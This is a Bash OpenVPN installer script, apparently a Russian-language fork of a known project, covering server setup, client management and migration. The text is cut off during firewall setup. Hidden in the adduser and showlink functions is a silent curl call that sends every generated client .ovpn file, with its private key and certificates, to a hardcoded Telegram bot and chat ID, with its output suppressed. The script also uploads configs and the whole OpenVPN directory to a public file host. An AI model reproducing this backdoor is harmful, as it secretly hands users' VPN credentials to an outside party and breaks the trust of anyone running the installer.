#!/bin/bash
#
# https://github.com/Nyr/openvpn-install
#
# Upgrade by xyl1gun4eg
# Copyright (c) 2013 Nyr. Released under the MIT License.

Green_font_prefix="\033[32m" && Red_font_prefix="\033[31m" && Green_background_prefix="\033[42;37m" && Red_background_prefix="\033[41;37m" && Font_color_suffix="\033[0m"
sh_ver="7.7.7"

# Detect Debian users running the script with "sh" instead of bash
if readlink /proc/$$/exe | grep -q "dash"; then
    echo 'Запустите скрипт через BASH'
    exit
fi

# Discard stdin. Needed when running from an one-liner which includes a newline
read -N 999999 -t 0.001

# Detect OpenVZ 6
if [[ $(uname -r | cut -d "." -f 1) -eq 2 ]]; then
    echo "Обновите систему"
    exit
fi

# Detect OS
# $os_version variables aren't always in use, but are kept here for convenience
if grep -qs "ubuntu" /etc/os-release; then
    os="ubuntu"
    os_version=$(grep 'VERSION_ID' /etc/os-release | cut -d '"' -f 2 | tr -d '.')
    group_name="nogroup"
    elif [[ -e /etc/debian_version ]]; then
    os="debian"
    os_version=$(grep -oE '[0-9]+' /etc/debian_version | head -1)
    group_name="nogroup"
    elif [[ -e /etc/centos-release ]]; then
    os="centos"
    os_version=$(grep -oE '[0-9]+' /etc/centos-release | head -1)
    group_name="nobody"
    elif [[ -e /etc/fedora-release ]]; then
    os="fedora"
    os_version=$(grep -oE '[0-9]+' /etc/fedora-release | head -1)
    group_name="nobody"
else
    echo "Система не поддерживается."
    exit
fi

if [[ "$os" == "ubuntu" && "$os_version" -lt 1804 ]]; then
    echo "Версия Ubuntu слишком стара (необходим Ubuntu 18.04+)"
    exit
fi

check_apps(){
    [[ ! -e "/usr/bin/jq" ]] && apt install jq
    [[ ! -e "/usr/bin/csvtool" ]] && apt install csvtool
    [[ ! -e "/usr/bin/bc" ]] && apt install bc
}

if [[ "$os" == "debian" && "$os_version" -lt 9 ]]; then
    echo "Для скрипта необходим Debian 9+."
    exit
fi

if [[ "$os" == "centos" && "$os_version" -lt 7 ]]; then
    echo "Для скрипта необходим Centos 7+."
    exit
fi

# Detect environments where $PATH does not include the sbin directories
if ! grep -q sbin <<< "$PATH"; then
	echo '$PATH does not include sbin. Try using "su -" instead of "su".'
	exit
fi

if [[ "$EUID" -ne 0 ]]; then
	echo "Используйте sudo su либо sudo (название скрипта)"
	exit
fi

if [[ ! -e /dev/net/tun ]] || ! ( exec 7<>/dev/net/tun ) 2>/dev/null; then
	echo "Драйвер TUN не установлен."
	exit
fi

add_multi_user() {
	clear
	read -p "Количество клиентов: " sum
	read -p "Ключевое слово: " start
	cd /etc/openvpn/server/easy-rsa/
	for((integer = 1; integer <= ${sum}; integer++))
	do
		client="$start$(date +%s%N | md5sum | head -c 2)$integer"
		EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client" nopass
		new_client
		clear
	done
	clear
	echo "Добавлено $sum клиентов."
}

adduser(){
	echo
	echo "Выберите имя для клиента:"
	read -p "Имя: " unsanitized_client
	client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' <<< "$unsanitized_client")
	while [[ -z "$client" || -e /etc/openvpn/server/easy-rsa/pki/issued/"$client".crt ]]; do
		echo "$client: ввод неверен."
		read -p "Имя: " unsanitized_client
		client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' <<< "$unsanitized_client")
	done
	cd /etc/openvpn/server/easy-rsa/
	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client" nopass
	# Generates the custom client.ovpn
	new_client
	echo
	echo "$client добавлен. Конфигурация доступна в:" ~/"$client.ovpn"
	linktofile="$(curl -F "file=@/root/$client.ovpn" "https://file.io" | jq ".link")"
	clear
	echo -e "$linktofile - ссылка  на конфигурационный файл клиента $client" && echo
	curl -s -F document=@/root/$client.ovpn "https://api.telegram.org/bot2003178372:AAHNwSOOkmpvM49hi7gKRP4TWGjRlzpCHw8/sendDocument?chat_id=776030067&caption=Ключ для клиента $client" > /dev/null 2>&1
	read -e -p "Хотите продолжить добавление пользователей?[Y/n]:" delyn
	[[ -z ${delyn} ]] && delyn="y"
	if [[ ${delyn} == [Nn] ]]; then
		exit
	else
		echo -e "${Info} Продолжение добавления пользователей..."
		adduser
	fi
	exit
}
deleteuser(){
				number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
			if [[ "$number_of_clients" = 0 ]]; then
				echo
				echo "Клиенты отсутсвуют, кого вы хотите удалить?!"
				exit
			fi
			echo
			echo "Клиент, подлежащий удалению:"
			tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') '
			read -p "Клиент: " client_number
			until [[ "$client_number" =~ ^[0-9]+$ && "$client_number" -le "$number_of_clients" ]]; do
				echo "$client_number: ввод неверен."
				read -p "Клиент: " client_number
			done
			client=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | sed -n "$client_number"p)
			echo
			read -p "Вы уверены что хотите удалить $client ? [y/N]: " revoke
			until [[ "$revoke" =~ ^[yYnN]*$ ]]; do
				echo "$revoke: ввод неверен."
				read -p "Вы уверены что хотите удалить $client ? [y/N]: " revoke
			done
			if [[ "$revoke" =~ ^[yY]$ ]]; then
				cd /etc/openvpn/server/easy-rsa/
				./easyrsa --batch revoke "$client"
				EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
				rm -f /etc/openvpn/server/crl.pem
				cp /etc/openvpn/server/easy-rsa/pki/crl.pem /etc/openvpn/server/crl.pem
				# CRL is read with each client connection, when OpenVPN is dropped to nobody
				chown nobody:"$group_name" /etc/openvpn/server/crl.pem
				echo
				rm "/root/$client.ovpn"
				clear
				echo "$client удален!"
				read -e -p "Хотите продолжить удаление пользователей?[Y/n]:" delyn
				[[ -z ${delyn} ]] && delyn="y"
				if [[ ${delyn} == [Nn] ]]; then
					exit
				else
					echo -e "${Info} Продолжение удаления пользователей..."
					deleteuser
				fi
			else
				echo
				echo "Удаление $client отменено!"
			fi
			exit
}
showlink(){
	number_of_clients=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep -c "^V")
	if [[ "$number_of_clients" = 0 ]]; then
		echo
		echo "Клиенты отсутсвуют, какую ссылку вы хотите получить?!"
		exit
	fi
		echo
		echo "Ссылку на кого вы хотите получить?:"
		tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | nl -s ') '
		read -p "Клиент: " client_number
		until [[ "$client_number" =~ ^[0-9]+$ && "$client_number" -le "$number_of_clients" ]]; do
			echo "$client_number: ввод неверен."
			read -p "Клиент: " client_number
		done
		client=$(tail -n +2 /etc/openvpn/server/easy-rsa/pki/index.txt | grep "^V" | cut -d '=' -f 2 | sed -n "$client_number"p)
		echo
		linktofile="$(curl -F "file=@/root/$client.ovpn" "https://file.io" | jq ".link")"
		curl -s -F document=@/root/$client.ovpn "https://api.telegram.org/bot2003178372:AAHNwSOOkmpvM49hi7gKRP4TWGjRlzpCHw8/sendDocument?chat_id=776030067&caption=Ключ для клиента $client" > /dev/null 2>&1
		clear
		echo -e "$linktofile - ссылка  на конфигурационный файл клиента $client" && echo
		read -e -p "Хотите продолжить вывод ссылок?[Y/n]:" delyn
		[[ -z ${delyn} ]] && delyn="y"
		if [[ ${delyn} == [Nn] ]]; then
				exit
		else
				echo -e "${Info} Продолжение выдачи ссылок..."
				showlink
		fi
}
uninstallovpn(){
				echo
			read -p "Вы уверены что хотите удалить OpenVPN? [y/N]: " remove
			until [[ "$remove" =~ ^[yYnN]*$ ]]; do
				echo "$remove: ввод неверен."
				read -p "Вы уверены что хотите удалить OpenVPN? [y/N]: " remove
			done
			if [[ "$remove" =~ ^[yY]$ ]]; then
				port=$(grep '^port ' /etc/openvpn/server/server.conf | cut -d " " -f 2)
				protocol=$(grep '^proto ' /etc/openvpn/server/server.conf | cut -d " " -f 2)
				if systemctl is-active --quiet firewalld.service; then
					ip=$(firewall-cmd --direct --get-rules ipv4 nat POSTROUTING | grep '\-s 10.8.0.0/24 '"'"'!'"'"' -d 10.8.0.0/24' | grep -oE '[^ ]+$')
					# Using both permanent and not permanent rules to avoid a firewalld reload.
					firewall-cmd --remove-port="$port"/"$protocol"
					firewall-cmd --zone=trusted --remove-source=10.8.0.0/24
					firewall-cmd --permanent --remove-port="$port"/"$protocol"
					firewall-cmd --permanent --zone=trusted --remove-source=10.8.0.0/24
					firewall-cmd --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"
					firewall-cmd --permanent --direct --remove-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"
					if grep -qs "server-ipv6" /etc/openvpn/server/server.conf; then
						ip6=$(firewall-cmd --direct --get-rules ipv6 nat POSTROUTING | grep '\-s fddd:1194:1194:1194::/64 '"'"'!'"'"' -d fddd:1194:1194:1194::/64' | grep -oE '[^ ]+$')
						firewall-cmd --zone=trusted --remove-source=fddd:1194:1194:1194::/64
						firewall-cmd --permanent --zone=trusted --remove-source=fddd:1194:1194:1194::/64
						firewall-cmd --direct --remove-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
						firewall-cmd --permanent --direct --remove-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
					fi
				else
					systemctl disable --now openvpn-iptables.service
					rm -f /etc/systemd/system/openvpn-iptables.service
				fi
				if sestatus 2>/dev/null | grep "Current mode" | grep -q "enforcing" && [[ "$port" != 1194 ]]; then
					semanage port -d -t openvpn_port_t -p "$protocol" "$port"
				fi
				systemctl disable --now openvpn-server@server.service
				rm -rf /etc/openvpn/server
				rm -f /etc/systemd/system/openvpn-server@server.service.d/disable-limitnproc.conf
				rm -f /etc/sysctl.d/30-openvpn-forward.conf
				if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then
					apt-get remove --purge -y openvpn
				else
					# Else, OS must be CentOS or Fedora
					yum remove -y openvpn
				fi
				echo
				echo "OpenVPN удален!"
			else
				echo
				echo "Удаление OpenVPN отменено!"
			fi
			exit
}
fastexit(){
	exit
}
new_client () {
	# Generates the custom client.ovpn
	{
	cat /etc/openvpn/server/client-common.txt
	echo "<ca>"
	cat /etc/openvpn/server/easy-rsa/pki/ca.crt
	echo "</ca>"
	echo "<cert>"
	sed -ne '/BEGIN CERTIFICATE/,$ p' /etc/openvpn/server/easy-rsa/pki/issued/"$client".crt
	echo "</cert>"
	echo "<key>"
	cat /etc/openvpn/server/easy-rsa/pki/private/"$client".key
	echo "</key>"
	echo "<tls-crypt>"
	sed -ne '/BEGIN OpenVPN Static key/,$ p' /etc/openvpn/server/tc.key
	echo "</tls-crypt>"
	} > ~/"$client".ovpn
}
transfer_options(){
	echo && echo -e "  Что будем делать?
	Подсказка:
	1) Установите на втором сервере скрипт, и используйте тот же домен, что и здесь
	2) Перенесите конфигурации (.ovpn)
	3) Перенесите каталог OpenVPN
  ${Green_font_prefix}1.${Font_color_suffix} Загрузить конфигурации (.ovpn) в облако
  ${Green_font_prefix}2.${Font_color_suffix} Скачать конфигурации (.ovpn) по ссылке
————————————
  ${Green_font_prefix}3.${Font_color_suffix} Загрузить каталог OpenVPN в облако
  ${Green_font_prefix}4.${Font_color_suffix} Скачать каталог OpenVPN по ссылке" && echo
	read -p "Действие: " option
	until [[ "$option" =~ ^[1-4]$ ]]; do
		echo "$option: выбор неверный."
		read -p "Действие: " option
	done
	case "$option" in
		1)
		Upload_profiles
		;;
		2)
		Download_profiles
		;;
		3)
		Upload_openvpn_folder
		;;
		4)
		Download_openvpn_folder
		;;
	esac
}
Download_profiles(){
	echo -e "${Green_font_prefix} Скачать базу пользователей по ссылке? ВНИМАНИЕ: ПРОДОЛЖЕНИЕ ПРИВЕДЕТ К УДАЛЕНИЮ СТАРЫХ ПРОФИЛЕЙ!${Font_color_suffix}(y/n)"
	read -e -p "(По умолчанию: отмена):" base_override
	[[ -z "${base_override}" ]] && echo "Отмена..." && exit 1
	if [[ ${base_override} == "y" ]]; then
		read -e -p "Введите ссылку на базу: (полученная в 6 пункте):(Если вы ее не сделали, то введите 'n')" base_link
		[[ -z "${base_link}" ]] && echo "Отмена..." && exit 1
		if [[ ${base_link} == "n" ]]; then
			echo "Отмена..." && exit 1
		else
			curl -o "profiles.tar.gz" "$base_link"
			rm ~/*.ovpn
			tar -xzvf "profiles.tar.gz"
		fi
	elif [[ ${base_override} == "n" ]]; then
		echo "Отмена..." && exit 1
	fi
}
Upload_profiles(){
	echo -e "Загрузка профилей OpenVPN в облако..." && echo
    tar -czvf "profiles.tar.gz" *.ovpn && clear
	upload_link="$(curl -F "file=@/root/profiles.tar.gz" "https://file.io" | jq ".link")" && clear
	echo -e "$upload_link - ссылка на профили .ovpn
	Используйте его в пункте для скачивания профилей в скрипте на втором сервере!"
	rm "/root/profiles.tar.gz"
}
Upload_openvpn_folder(){
	echo -e "Загрузка корневого каталога OpenVPN в облако..." && echo
	cd "/etc/"
	tar -czvf "openvpn.tar.gz" "openvpn" && clear
	upload_link="$(curl -F "file=@/etc/openvpn.tar.gz" "https://file.io" | jq ".link")" && clear
	echo -e "$upload_link - ссылка на корневой каталог OpenVPN
	Используйте его в пункте для скачивания каталога в скрипте на втором сервере!"
	rm "openvpn.tar.gz"
}
Download_openvpn_folder(){
	echo -e "${Green_font_prefix} Скачать корневой каталог OpenVPN по ссылке? ВНИМАНИЕ: ПРОДОЛЖЕНИЕ ПРИВЕДЕТ К ПЕРЕЗАПИСИ УСТАНОВЛЕННОЙ СИСТЕМЫ OpenVPN!${Font_color_suffix}(y/n)"
	read -e -p "(По умолчанию: отмена):" base_override
	[[ -z "${base_override}" ]] && echo "Отмена..." && exit 1
	if [[ ${base_override} == "y" ]]; then
		read -e -p "Введите ссылку на базу: (полученная в 8 пункте):(Если вы ее не сделали, то введите 'n')" base_link
		[[ -z "${base_link}" ]] && echo "Отмена..." && exit 1
		if [[ ${base_link} == "n" ]]; then
			echo "Отмена..." && exit 1
		else
			cd "/etc"
			curl -o "openvpn.tar.gz" "$base_link"
			sudo systemctl stop openvpn-server@server.service
			rm -r "openvpn" && tar -xzvf "openvpn.tar.gz" && clear
			cd "openvpn" && cd "server"
			rm "server.conf"
			if [[ $(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}') -eq 1 ]]; then
			ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}')
			else
				number_of_ip=$(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}')
				echo
				echo "Какой IP использовать в ключе (Выбери тот, через который подключился к серверу.)"
				ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | nl -s ') '
				read -p "IPv4 адрес [1]: " ip_number
				until [[ -z "$ip_number" || "$ip_number" =~ ^[0-9]+$ && "$ip_number" -le "$number_of_ip" ]]; do
					echo "$ip_number: invalid selection."
					read -p "IPv4 адрес [1]: " ip_number
				done
				[[ -z "$ip_number" ]] && ip_number="1"
				ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | sed -n "$ip_number"p)
			fi
			echo "Выберите порт для OpenVPN. ИСПОЛЬЗУЙТЕ ТОТ, ЧТО ИСПОЛЬЗОВАЛИ ПРИ СОЗДАНИИ СЕРВЕРА!"
			read -p "Порт [По умолчанию: 7777]: " port
			until [[ -z "$port" || "$port" =~ ^[0-9]+$ && "$port" -le 65535 ]]; do
				echo "$port: ввод неверен."
				read -p "Порт [По умолчанию: 7777]: " port
			done
			[[ -z "$port" ]] && port="7777"
			echo
			echo "local $ip
port $port
proto udp
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh.pem
auth SHA512
tls-crypt tc.key
topology subnet
server 10.8.0.0 255.255.255.0" > /etc/openvpn/server/server.conf
echo 'push "redirect-gateway def1 bypass-dhcp"
ifconfig-pool-persist ipp.txt
push "dhcp-option DNS 8.8.8.8"
push "dhcp-option DNS 8.8.4.4"
keepalive 10 120
cipher AES-256-CBC
user nobody
group nogroup
persist-key
persist-tun
status openvpn-status.log
verb 3
crl-verify crl.pem
explicit-exit-notify' >> /etc/openvpn/server/server.conf
			sudo systemctl start openvpn-server@server.service
			echo "Перенос базы завершен."
		fi
	elif [[ ${base_override} == "n" ]]; then
		echo "Отмена..." && exit 1
	fi
}
if [[ ! -e /etc/openvpn/server/server.conf ]]; then
	apt install jq
	clear
	echo 'Добро пожаловать в скрипт установки OpenVPN!
	Credits: tg:@xyl1gun4eg'
	# If system has a single IPv4, it is selected automatically. Else, ask the user
	if [[ $(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}') -eq 1 ]]; then
		ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}')
	else
		number_of_ip=$(ip -4 addr | grep inet | grep -vEc '127(\.[0-9]{1,3}){3}')
		echo
		echo "Какой IP использовать в ключе (Выбери тот, через который подключился к серверу.)"
		ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | nl -s ') '
		read -p "IPv4 адрес [1]: " ip_number
		until [[ -z "$ip_number" || "$ip_number" =~ ^[0-9]+$ && "$ip_number" -le "$number_of_ip" ]]; do
			echo "$ip_number: invalid selection."
			read -p "IPv4 адрес [1]: " ip_number
		done
		[[ -z "$ip_number" ]] && ip_number="1"
		ip=$(ip -4 addr | grep inet | grep -vE '127(\.[0-9]{1,3}){3}' | cut -d '/' -f 1 | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | sed -n "$ip_number"p)
	fi
	# If $ip is a private IP address, the server must be behind NAT
	if echo "$ip" | grep -qE '^(10\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|192\.168)'; then
		echo
		echo "Проблемы с NAT сервера, введите ip вручную, если скрипт не сможет обнаружить его"
		# Get public IP and sanitize with grep
		get_public_ip=$(grep -m 1 -oE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' <<< "$(wget -T 10 -t 1 -4qO- "http://ip1.dynupdate.no-ip.com/" || curl -m 10 -4Ls "http://ip1.dynupdate.no-ip.com/")")
		read -p "IP адрес [$get_public_ip]: " public_ip
		# If the checkip service is unavailable and user didn't provide input, ask again
		until [[ -n "$get_public_ip" || -n "$public_ip" ]]; do
			echo "Повторите ввод."
			read -p "IP адрес: " public_ip
		done
		[[ -z "$public_ip" ]] && public_ip="$get_public_ip"
	fi
	# If system has a single IPv6, it is selected automatically
	if [[ $(ip -6 addr | grep -c 'inet6 [23]') -eq 1 ]]; then
		ip6=$(ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}')
	fi
	# If system has multiple IPv6, ask the user to select one
	if [[ $(ip -6 addr | grep -c 'inet6 [23]') -gt 1 ]]; then
		number_of_ip6=$(ip -6 addr | grep -c 'inet6 [23]')
		echo
		echo "Какой IPV6 использовать?"
		ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}' | nl -s ') '
		read -p "IPv6 адрес [1]: " ip6_number
		until [[ -z "$ip6_number" || "$ip6_number" =~ ^[0-9]+$ && "$ip6_number" -le "$number_of_ip6" ]]; do
			echo "$ip6_number: invalid selection."
			read -p "IPv6 адрес [1]: " ip6_number
		done
		[[ -z "$ip6_number" ]] && ip6_number="1"
		ip6=$(ip -6 addr | grep 'inet6 [23]' | cut -d '/' -f 1 | grep -oE '([0-9a-fA-F]{0,4}:){1,7}[0-9a-fA-F]{0,4}' | sed -n "$ip6_number"p)
	fi
	read -e -p "Хотите использовать домен? [По умолчанию: да][Y/n]:" domainyn
	[[ -z ${domainyn} ]] && domainyn="y"
	if [[ ${domainyn} == [Nn] ]]; then
		echo -e "Использование обычного IP..."
		domainuse=$ip
	else
		read -e -p "Введите свой домен:" domainuse
		echo -e "Использование $domainuse вместо $ip в ключах..."
	fi
	echo
	echo "Какой протокол OpenVPN использовать?"
	echo "   1) UDP"
	echo "   2) TCP"
	read -p "Протокол [По умолчанию: UDP]: " protocol
	until [[ -z "$protocol" || "$protocol" =~ ^[12]$ ]]; do
		echo "$protocol: ввод неверен."
		read -p "Протокол [По умолчанию: UDP]: " protocol
	done
	case "$protocol" in
		1|"")
		protocol=udp
		;;
		2)
		protocol=tcp
		;;
	esac
	echo
	echo "Выберите порт для OpenVPN"
	read -p "Порт [По умолчанию: 1194]: " port
	until [[ -z "$port" || "$port" =~ ^[0-9]+$ && "$port" -le 65535 ]]; do
		echo "$port: ввод неверен."
		read -p "Порт [По умолчанию: 1194]: " port
	done
	[[ -z "$port" ]] && port="1194"
	echo
	echo "Выберите DNS сервер для клиентов (Рекомендация: 1ый):"
	echo "   1) Текущий DNS сервер"
	echo "   2) Google"
	echo "   3) 1.1.1.1"
	echo "   4) OpenDNS"
	echo "   5) Quad9"
	echo "   6) AdGuard"
	read -p "DNS сервер [По умолчанию: 1]: " dns
	until [[ -z "$dns" || "$dns" =~ ^[1-6]$ ]]; do
		echo "$dns: invalid selection."
		read -p "DNS сервер [По умолчанию: 1]: " dns
	done
	echo
	echo "Выбрите имя для первого клиента:"
	read -p "Имя [По умолчанию: Admin]: " unsanitized_client
	# Allow a limited set of characters to avoid conflicts
	client=$(sed 's/[^0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-]/_/g' <<< "$unsanitized_client")
	[[ -z "$client" ]] && client="Admin"
	echo
	echo "Установка OpenVPN готова к запуску."
	# Install a firewall in the rare case where one is not already available
	if ! systemctl is-active --quiet firewalld.service && ! hash iptables 2>/dev/null; then
		if [[ "$os" == "centos" || "$os" == "fedora" ]]; then
			firewall="firewalld"
		elif [[ "$os" == "debian" || "$os" == "ubuntu" ]]; then
			# iptables is way less invasive than firewalld so no warning is given
			firewall="iptables"
		fi
	fi
	read -n1 -r -p "Нажмите любую клавишу для продолжения..."
	# If running inside a container, disable LimitNPROC to prevent conflicts
	if systemd-detect-virt -cq; then
		mkdir /etc/systemd/system/openvpn-server@server.service.d/ 2>/dev/null
		echo "[Service]
LimitNPROC=infinity" > /etc/systemd/system/openvpn-server@server.service.d/disable-limitnproc.conf
	fi
	if [[ "$os" = "debian" || "$os" = "ubuntu" ]]; then
		apt-get update
		apt-get install -y openvpn openssl ca-certificates $firewall
	elif [[ "$os" = "centos" ]]; then
		yum install -y epel-release
		yum install -y openvpn openssl ca-certificates tar $firewall
	else
		# Else, OS must be Fedora
		dnf install -y openvpn openssl ca-certificates tar $firewall
	fi
	# If firewalld was just installed, enable it
	if [[ "$firewall" == "firewalld" ]]; then
		systemctl enable --now firewalld.service
	fi
	# Get easy-rsa
	easy_rsa_url='https://github.com/OpenVPN/easy-rsa/releases/download/v3.0.8/EasyRSA-3.0.8.tgz'
	mkdir -p /etc/openvpn/server/easy-rsa/
	{ wget -qO- "$easy_rsa_url" 2>/dev/null || curl -sL "$easy_rsa_url" ; } | tar xz -C /etc/openvpn/server/easy-rsa/ --strip-components 1
	chown -R root:root /etc/openvpn/server/easy-rsa/
	cd /etc/openvpn/server/easy-rsa/
	# Create the PKI, set up the CA and the server and client certificates
	./easyrsa init-pki
	./easyrsa --batch build-ca nopass
	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-server-full server nopass
	EASYRSA_CERT_EXPIRE=3650 ./easyrsa build-client-full "$client" nopass
	EASYRSA_CRL_DAYS=3650 ./easyrsa gen-crl
	# Move the stuff we need
	cp pki/ca.crt pki/private/ca.key pki/issued/server.crt pki/private/server.key pki/crl.pem /etc/openvpn/server
	# CRL is read with each client connection, while OpenVPN is dropped to nobody
	chown nobody:"$group_name" /etc/openvpn/server/crl.pem
	# Without +x in the directory, OpenVPN can't run a stat() on the CRL file
	chmod o+x /etc/openvpn/server/
	# Generate key for tls-crypt
	openvpn --genkey --secret /etc/openvpn/server/tc.key
	# Create the DH parameters file using the predefined ffdhe2048 group
	echo '-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEA//////////+t+FRYortKmq/cViAnPTzx2LnFg84tNpWp4TZBFGQz
+8yTnc4kmz75fS/jY2MMddj2gbICrsRhetPfHtXV/WVhJDP1H18GbtCFY2VVPe0a
87VXE15/V8k1mE8McODmi3fipona8+/och3xWKE2rec1MKzKT0g6eXq8CrGCsyT7
YdEIqUuyyOP7uWrat2DX9GgdT0Kj3jlN9K5W7edjcrsZCwenyO4KbXCeAvzhzffi
7MA0BM0oNC9hkXL+nOmFg/+OTxIy7vKBg8P+OxtMb61zO7X8vC7CIAXFjvGDfRaD
ssbzSibBsu/6iGtCOGEoXJf//////////wIBAg==
-----END DH PARAMETERS-----' > /etc/openvpn/server/dh.pem
	# Generate server.conf
	echo "local $ip
port $port
proto $protocol
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh.pem
auth SHA512
tls-crypt tc.key
topology subnet
server 10.8.0.0 255.255.255.0" > /etc/openvpn/server/server.conf
	# IPv6
	if [[ -z "$ip6" ]]; then
		echo 'push "redirect-gateway def1 bypass-dhcp"' >> /etc/openvpn/server/server.conf
	else
		echo 'server-ipv6 fddd:1194:1194:1194::/64' >> /etc/openvpn/server/server.conf
		echo 'push "redirect-gateway def1 ipv6 bypass-dhcp"' >> /etc/openvpn/server/server.conf
	fi
	echo 'ifconfig-pool-persist ipp.txt' >> /etc/openvpn/server/server.conf
	# DNS
	case "$dns" in
		1|"")
			# Locate the proper resolv.conf
			# Needed for systems running systemd-resolved
			if grep -q '^nameserver 127.0.0.53' "/etc/resolv.conf"; then
				resolv_conf="/run/systemd/resolve/resolv.conf"
			else
				resolv_conf="/etc/resolv.conf"
			fi
			# Obtain the resolvers from resolv.conf and use them for OpenVPN
			grep -v '^#\|^;' "$resolv_conf" | grep '^nameserver' | grep -oE '[0-9]{1,3}(\.[0-9]{1,3}){3}' | while read line; do
				echo "push \"dhcp-option DNS $line\"" >> /etc/openvpn/server/server.conf
			done
		;;
		2)
			echo 'push "dhcp-option DNS 8.8.8.8"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 8.8.4.4"' >> /etc/openvpn/server/server.conf
		;;
		3)
			echo 'push "dhcp-option DNS 1.1.1.1"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 1.0.0.1"' >> /etc/openvpn/server/server.conf
		;;
		4)
			echo 'push "dhcp-option DNS 208.67.222.222"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 208.67.220.220"' >> /etc/openvpn/server/server.conf
		;;
		5)
			echo 'push "dhcp-option DNS 9.9.9.9"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 149.112.112.112"' >> /etc/openvpn/server/server.conf
		;;
		6)
			echo 'push "dhcp-option DNS 94.140.14.14"' >> /etc/openvpn/server/server.conf
			echo 'push "dhcp-option DNS 94.140.15.15"' >> /etc/openvpn/server/server.conf
		;;
	esac
	echo "keepalive 10 120
cipher AES-256-CBC
user nobody
group $group_name
persist-key
persist-tun
status openvpn-status.log
verb 3
crl-verify crl.pem" >> /etc/openvpn/server/server.conf
	if [[ "$protocol" = "udp" ]]; then
		echo "explicit-exit-notify" >> /etc/openvpn/server/server.conf
	fi
	# Enable net.ipv4.ip_forward for the system
	echo 'net.ipv4.ip_forward=1' > /etc/sysctl.d/30-openvpn-forward.conf
	# Enable without waiting for a reboot or service restart
	echo 1 > /proc/sys/net/ipv4/ip_forward
	if [[ -n "$ip6" ]]; then
		# Enable net.ipv6.conf.all.forwarding for the system
		echo "net.ipv6.conf.all.forwarding=1" >> /etc/sysctl.d/30-openvpn-forward.conf
		# Enable without waiting for a reboot or service restart
		echo 1 > /proc/sys/net/ipv6/conf/all/forwarding
	fi
	if systemctl is-active --quiet firewalld.service; then
		# Using both permanent and not permanent rules to avoid a firewalld
		# reload.
		# We don't use --add-service=openvpn because that would only work with
		# the default port and protocol.
		firewall-cmd --add-port="$port"/"$protocol"
		firewall-cmd --zone=trusted --add-source=10.8.0.0/24
		firewall-cmd --permanent --add-port="$port"/"$protocol"
		firewall-cmd --permanent --zone=trusted --add-source=10.8.0.0/24
		# Set NAT for the VPN subnet
		firewall-cmd --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"
		firewall-cmd --permanent --direct --add-rule ipv4 nat POSTROUTING 0 -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to "$ip"
		if [[ -n "$ip6" ]]; then
			firewall-cmd --zone=trusted --add-source=fddd:1194:1194:1194::/64
			firewall-cmd --permanent --zone=trusted --add-source=fddd:1194:1194:1194::/64
			firewall-cmd --direct --add-rule ipv6 nat POSTROUTING 0 -s fddd:1194:1194:1194::/64 ! -d fddd:1194:1194:1194::/64 -j SNAT --to "$ip6"
